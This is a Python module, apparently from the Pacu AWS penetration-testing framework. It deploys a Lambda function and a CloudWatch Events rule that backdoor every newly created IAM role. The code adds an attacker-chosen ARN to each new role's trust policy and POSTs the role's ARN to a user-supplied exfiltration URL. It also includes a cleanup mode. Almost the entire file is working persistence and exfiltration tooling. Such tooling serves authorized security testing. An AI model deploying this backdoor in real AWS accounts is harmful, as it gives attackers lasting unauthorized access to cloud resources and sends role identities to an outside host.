#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError
from pathlib import Path
from copy import deepcopy
import random
import string
import os

from pacu.core.lib import module_data_dir
from pacu.utils import zip_file

module_info = {
    'name': 'lambda__backdoor_new_roles',

    'author': 'Spencer Gietzen of Rhino Security Labs based on code from Daniel Grzelak (https://github.com/dagrz/aws_pwn/blob/master/persistence/backdoor_created_roles_lambda/backdoor_created_roles_lambda.py)',

    'category': 'PERSIST',

    'one_liner': 'Creates a Lambda function and CloudWatch Events rule to backdoor new IAM roles.',

    'description': 'This module creates a new Lambda function and an accompanying CloudWatch Events rule that will trigger upon a new IAM role being created in the account. The function will automatically add the supplied ARN to the assume role policy document and exfiltrate the ARN of the role so you can assume it. The function and rule will always be created in us-east-1, as that is the only CloudWatch region that gets sent IAM events. Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-east-1.',

    'services': ['Lambda', 'Events', 'IAM'],

    'prerequisite_modules': ['iam__enum_users_roles_policies_groups'],

    'external_dependencies': [],

    'arguments_to_autocomplete': ['--arn', '--exfil-url','--role-arn', '--cleanup'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--arn', required=False, default=None, help='The ARN of your own IAM user or role that you want to add to the assume role policy document.')
parser.add_argument('--exfil-url', required=False, default=None, help='The URL to POST backdoored roles\' ARNs to, so you can assume them.')
parser.add_argument('--role-arn', required=False, default=None, help='The role should allow Lambda to assume it and have at least the IAM UpdateAssumeRolePolicy and GetRole permissions')
parser.add_argument('--cleanup', required=False, default=False, action='store_true', help='Run the module in cleanup mode. This will remove any known backdoors that the module added from the account.')


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ######
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    fetch_data = pacu_main.fetch_data

    MODULE_PATH = Path(__file__).parent
    MODULE_SESSION_PATH = module_data_dir(module_info['name'])
    CREATED_LAMBDA_FUNCTIONS_PATH = MODULE_SESSION_PATH/'created-lambda-functions.txt'
    CREATED_CLOUDWATCH_EVENTS_RULES_PATH = MODULE_SESSION_PATH/'created-cloudwatch-events-rules.txt'
    LAMBDA_FUNCTION_ZIP_PATH = MODULE_SESSION_PATH/'lambda_function.zip'
    ######

    if args.cleanup:
        created_lambda_functions = []
        created_cwe_rules = []

        if os.path.isfile(CREATED_LAMBDA_FUNCTIONS_PATH):
            with open(CREATED_LAMBDA_FUNCTIONS_PATH, 'r') as f:
                created_lambda_functions = f.readlines()
        if os.path.isfile(CREATED_CLOUDWATCH_EVENTS_RULES_PATH):
            with open(CREATED_CLOUDWATCH_EVENTS_RULES_PATH, 'r') as f:
                created_cwe_rules = f.readlines()

        if created_lambda_functions:
            delete_function_file = True
            for function in created_lambda_functions:
                name = function.rstrip()
                print('  Deleting function {}...'.format(name))
                client = pacu_main.get_boto3_client('lambda', 'us-east-1')
                try:
                    client.delete_function(
                        FunctionName=name
                    )
                except ClientError as error:
                    code = error.response['Error']['Code']
                    if code == 'AccessDeniedException':
                        print('  FAILURE: MISSING NEEDED PERMISSIONS')
                    else:
                        print(code)
                    delete_function_file = False
                    break
            if delete_function_file:
                try:
                    os.remove(CREATED_LAMBDA_FUNCTIONS_PATH)
                except Exception as error:
                    print('  Failed to remove {}'.format(str(CREATED_LAMBDA_FUNCTIONS_PATH)))
                    print('    {}: {}'.format(type(error), error))

        if created_cwe_rules:
            delete_cwe_file = True
            for rule in created_cwe_rules:
                name = rule.rstrip()
                print('  Deleting rule {}...'.format(name))
                client = pacu_main.get_boto3_client('events', 'us-east-1')
                try:
                    client.remove_targets(
                        Rule=name,
                        Ids=['0']
                    )
                    client.delete_rule(
                        Name=name
                    )
                except ClientError as error:
                    code = error.response['Error']['Code']
                    if code == 'AccessDeniedException':
                        print('  FAILURE: MISSING NEEDED PERMISSIONS')
                    else:
                        print(code)
                    delete_cwe_file = False
                    break
            if delete_cwe_file:
                try:
                    os.remove(CREATED_CLOUDWATCH_EVENTS_RULES_PATH)
                except Exception as error:
                    print('  Failed to remove {}'.format(str(CREATED_CLOUDWATCH_EVENTS_RULES_PATH)))
                    print('    {}: {}'.format(type(error), error))

        print('Completed cleanup mode.\n')
        return {'cleanup': True}

    if not args.exfil_url:
        print('  --exfil-url is required if you are not running in cleanup mode!')
        return

    if not args.arn:
        print('  --arn is required if you are not running in cleanup mode!')
        return

    data = {'functions_created': 0, 'rules_created': 0, 'successes': 0}

    created_resources = {'LambdaFunctions': [], 'CWERules': []}
    
    if not args.role_arn:
        target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at '
                                'least the IAM UpdateAssumeRolePolicy and GetRole permissions. Enter the ARN now or just '
                                'press enter to enumerate a list of possible roles to choose from: ')
        if not target_role_arn:
            if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][0], '--roles', force=True) is False:
                print('Pre-req module not run successfully. Exiting...')
                return None
            roles = deepcopy(session.IAM['Roles'])

            print('Found {} roles. Choose one below.'.format(len(roles)))
            for i in range(0, len(roles)):
                print('  [{}] {}'.format(i, roles[i]['RoleName']))
            choice = input('Choose an option: ')
            target_role_arn = roles[int(choice)]['Arn']
    else:
        target_role_arn=args.role_arn

    # Import the Lambda function and modify the variables it needs
    with open(MODULE_PATH/'lambda_function.py.bak', 'r') as f:
        source_code = f.read()

    source_code = source_code.replace('POST_URL', args.exfil_url).replace('BACKDOOR_ARN', args.arn)

    # Zip the Lambda function
    try:
        print('  Zipping the Lambda function...\n')
        zip_data = {'lambda_function.py': source_code}
        zip_file_bytes = zip_file(LAMBDA_FUNCTION_ZIP_PATH, zip_data)
    except Exception as error:
        print('Failed to zip the Lambda function locally: {}\n'.format(error))
        return data

    client = pacu_main.get_boto3_client('lambda', 'us-east-1')

    try:
        function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
        response = client.create_function(
            FunctionName=function_name,
            Runtime='python3.9',
            Role=target_role_arn,
            Handler='lambda_function.lambda_handler',
            Code={
                'ZipFile': zip_file_bytes
            }
        )
        lambda_arn = response['FunctionArn']
        print('  Created Lambda function: {}'.format(function_name))
        data['functions_created'] += 1
        created_resources['LambdaFunctions'].append(function_name)

        client = pacu_main.get_boto3_client('events', 'us-east-1')

        response = client.put_rule(
            Name=function_name,
            EventPattern='{"source":["aws.iam"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventSource":["iam.amazonaws.com"],"eventName":["CreateRole"]}}',
            State='ENABLED'
        )
        print('  Created CloudWatch Events rule: {}'.format(response['RuleArn']))
        data['rules_created'] += 1

        client = pacu_main.get_boto3_client('lambda', 'us-east-1')

        client.add_permission(
            FunctionName=function_name,
            StatementId=''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10)),
            Action='lambda:InvokeFunction',
            Principal='events.amazonaws.com',
            SourceArn=response['RuleArn']
        )

        client = pacu_main.get_boto3_client('events', 'us-east-1')

        response = client.put_targets(
            Rule=function_name,
            Targets=[
                {
                    'Id': '0',
                    'Arn': lambda_arn
                }
            ]
        )
        if response['FailedEntryCount'] > 0:
            print('Failed to add the Lambda function as a target to the CloudWatch rule. Failed entries:')
            print(response['FailedEntries'])
        else:
            print('  Added Lambda target to CloudWatch Events rule.')
            data['successes'] += 1
            created_resources['CWERules'].append(function_name)
    except ClientError as error:
        code = error.response['Error']['Code']
        if code == 'AccessDeniedException':
            print('  FAILURE: MISSING NEEDED PERMISSIONS')
        else:
            print(code)

    if created_resources['LambdaFunctions']:
        with open(CREATED_LAMBDA_FUNCTIONS_PATH, 'w+') as f:
            f.write('\n'.join(created_resources['LambdaFunctions']))
    if created_resources['CWERules']:
        with open(CREATED_CLOUDWATCH_EVENTS_RULES_PATH, 'w+') as f:
            f.write('\n'.join(created_resources['CWERules']))

    print('Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-east-1.')

    return data


def summary(data, pacu_main):
    if data.get('cleanup'):
        return '  Completed cleanup of Lambda functions and CloudWatch Events rules.'

    return '  Lambda functions created: {}\n  CloudWatch Events rules created: {}\n  Successful backdoor deployments: {}\n'.format(data['functions_created'], data['rules_created'], data['successes'])
